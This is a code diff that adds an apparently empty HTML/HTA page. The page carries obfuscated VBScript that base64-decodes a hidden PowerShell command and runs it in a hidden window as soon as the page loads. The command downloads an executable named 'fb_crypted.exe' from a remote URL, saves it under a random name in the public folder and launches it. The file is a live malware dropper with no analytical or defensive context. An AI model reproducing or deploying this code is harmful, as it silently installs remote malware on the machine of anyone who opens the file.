@@ -1,0 +1,69 @@
+    <html xmlns="http://www.w3.org/1999/xhtml">
+    <head>
+    <meta content="text/html; charset=utf-8" http-equiv="Content-Type" />
+    <script language="VBScript">
+        Function SKEdflhEVWJt(ByVal owJCCKKXUxfNxY)
+            Const QGQCwZNzgDOEcAw = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+            Dim euOhcrqWUGV
+            Dim MTwktJPjzCH
+            Dim wBJqXjXPC
+            
+            owJCCKKXUxfNxY = Replace(owJCCKKXUxfNxY, vbCrLf, "")
+            owJCCKKXUxfNxY = Replace(owJCCKKXUxfNxY, vbTab, "")
+            owJCCKKXUxfNxY = Replace(owJCCKKXUxfNxY, " ", "")
+            
+            euOhcrqWUGV = Len(owJCCKKXUxfNxY)
+
+            For wBJqXjXPC = 1 To euOhcrqWUGV Step 4
+              Dim xJoLqvOF
+              Dim fXXqcleVkn
+              Dim cDevLFt
+              Dim GbrJlZTEKWWh
+              Dim FWlZTspGRW
+              Dim pLgGetDa
+
+              xJoLqvOF = 3
+              FWlZTspGRW = 0
+
+              For fXXqcleVkn = 0 To 3
+
+                cDevLFt = Mid(owJCCKKXUxfNxY, wBJqXjXPC + fXXqcleVkn, 1)
+
+                If cDevLFt = "=" Then
+                  xJoLqvOF = xJoLqvOF - 1
+                  GbrJlZTEKWWh = 0
+                Else
+                  GbrJlZTEKWWh = InStr(1, QGQCwZNzgDOEcAw, cDevLFt, vbBinaryCompare) - 1
+                End If
+
+                FWlZTspGRW = 64 * FWlZTspGRW + GbrJlZTEKWWh
+              Next
+              
+              FWlZTspGRW = Hex(FWlZTspGRW)
+              FWlZTspGRW = String(6 - Len(FWlZTspGRW), "0") & FWlZTspGRW
+              
+              pLgGetDa = Chr(CByte("&H" & Mid(FWlZTspGRW, 1, 2))) + _
+                Chr(CByte("&H" & Mid(FWlZTspGRW, 3, 2))) + _
+                Chr(CByte("&H" & Mid(FWlZTspGRW, 5, 2)))
+
+              MTwktJPjzCH = MTwktJPjzCH & Left(pLgGetDa, xJoLqvOF)
+            Next
+
+            SKEdflhEVWJt = MTwktJPjzCH
+          End Function
+
+    Dim JnuZKTnqY
+    Dim zzTyz
+    Dim aPlHnNuIIv
+    JnuZKTnqY = "cG93ZXJzaGVsbC5leGUgLUV4ZWN1dGlvblBvbGljeSBieXBhc3MgLVdpbmRvdyAxIFt2b2lkXSAkbnVsbDskZEdWWE9jUnkgPSBHZXQtUmFuZG9tIC1NaW4gMyAtTWF4IDQ7JGpldG5aelNrT3hvID0gKFtjaGFyW11dKFtjaGFyXTk3Li5bY2hhcl0xMjIpKTskdEJpT3NEd0hVd0lMdXpIID0gLWpvaW4gKCRqZXRuWnpTa094byB8IEdldC1SYW5kb20gLUNvdW50ICRkR1ZYT2NSeSB8ICUge1tDaGFyXSRffSk7JGpzY3hoTiA9IFtjaGFyXTB4MmUrW2NoYXJdMHg2NStbY2hhcl0weDc4K1tjaGFyXTB4NjU7JHlLQml4TnYgPSAkdEJpT3NEd0hVd0lMdXpIICsgJGpzY3hoTjskUnNjQ1dwZWRXPVtjaGFyXTB4NTMrW2NoYXJdMHg2MStbY2hhcl0weDRjOyRRVmhrc1Y9W2NoYXJdMHg0OStbY2hhcl0weDQ1K1tjaGFyXTB4NTg7JHlpT2JRPVtjaGFyXTB4NzMrW2NoYXJdMHg0MStbY2hhcl0weDcwK1tjaGFyXTB4NTM7c0FMIHp2amJ1c2VtbG9mICRSc2NDV3BlZFc7JHVuUnhBPVtjaGFyXTB4NGUrW2NoYXJdMHg2NStbY2hhcl0weDc0K1tjaGFyXTB4MmUrW2NoYXJdMHg1NytbY2hhcl0weDY1K1tjaGFyXTB4NjIrW2NoYXJdMHg0MytbY2hhcl0weDZjK1tjaGFyXTB4NjkrW2NoYXJdMHg2NStbY2hhcl0weDZlK1tjaGFyXTB4NzQ7enZqYnVzZW1sb2YgdmZ0cmggJFFWaGtzVjskVUd5aGZyTk9pZ3hnbEE9W2NoYXJdMHgyNCtbY2hhcl0weDY1K1tjaGFyXTB4NmUrW2NoYXJdMHg3NitbY2hhcl0weDNhK1tjaGFyXTB4NTArW2NoYXJdMHg1NStbY2hhcl0weDQyK1tjaGFyXTB4NGMrW2NoYXJdMHg0OStbY2hhcl0weDQzfHZmdHJoO3p2amJ1c2VtbG9mIGhqZnJ2byAkeWlPYlE7JFVuQ1RBcEJDbyA9ICRVR3loZnJOT2lneGdsQSArIFtjaGFyXTB4NWMgKyAkeUtCaXhOdjs7OzskWWJGdHNKZEZxaXNDcWcgPSAnYUhSMGNITTZMeTluYVhSb2RXSXVZMjl0TDNCeWIyTjJhV1YzTDJaaUwzSmhkeTl0WVhOMFpYSXZabUpmWTNKNWNIUmxaQzVsZUdVPSc7JFliRnRzSmRGcWlzQ3FnPVtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoJFliRnRzSmRGcWlzQ3FnKSk7JFBUVFJDWnVDdVAgPSBOZXctT2JqZWN0ICR1blJ4QTskb21uenhHYUpLRWN6aVZkID0gJFBUVFJDWnVDdVAuRG93bmxvYWREYXRhKCRZYkZ0c0pkRnFpc0NxZyk7W0lPLkZpbGVdOjpXcml0ZUFsbEJ5dGVzKCRVbkNUQXBCQ28sICRvbW56eEdhSktFY3ppVmQpO2hqZnJ2byAkVW5DVEFwQkNvOzskWVNXUVZ0ID0gQCgkYXNWRmRzQywgJHVpc2xISVFQLCAkelJKV1ltRCwgJFZWZnB0REZnKTtmb3JlYWNoKCRURW1saU9Ca3dueVhrbmsgaW4gJFlTV1FWdCl7JG51bGwgPSAkX30iIg=="
+    zzTyz = SKEdflhEVWJt(JnuZKTnqY)
+    set aPlHnNuIIv = CreateObject("Wscript.Shell")
+    aPlHnNuIIv.Run(zzTyz),0,true
+    self.close()
+    </script>
+    </head>
+    <div> 
+    </div>   
+    <body>
+    </body>
+    </html>
